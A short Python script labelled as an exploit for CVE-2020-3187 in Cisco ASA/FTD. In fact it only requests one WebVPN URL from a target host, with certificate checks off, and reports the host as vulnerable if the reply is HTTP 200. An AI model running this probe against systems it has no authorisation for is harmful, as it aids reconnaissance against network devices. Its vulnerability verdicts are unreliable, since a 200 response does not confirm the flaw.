#/usr/bin/python3 env
# encoding: utf-8



# CVE-2020-3187
# Product: Cisco Adaptive Security Appliance (ASA) and Firepower Threat Defense (FTD)
# Vulnerability: Arbitrary File Deletion / Path Traversal


import re
import requests
import warnings
from argparse import ArgumentParser
warnings.filterwarnings("ignore")


######################################################

def exploit(domain):
    req = requests.get(
        url = "https://{}/+CSCOE+/session_password.html".format(domain),
        verify = False
    )

    if req.status_code == 200:
        print(" [+] Vulnerable: {}".format(domain))
    else:
        print(" [-] Not vulnerable: {}".format(domain))

######################################################

def main():
    f = ArgumentParser()
    f.add_argument("-t", "--target", help="Target domain / IP address.", required=True)
    ARG = f.parse_args()

    exploit(ARG.target)

######################################################

if __name__ == "__main__":
    main()

######################################################


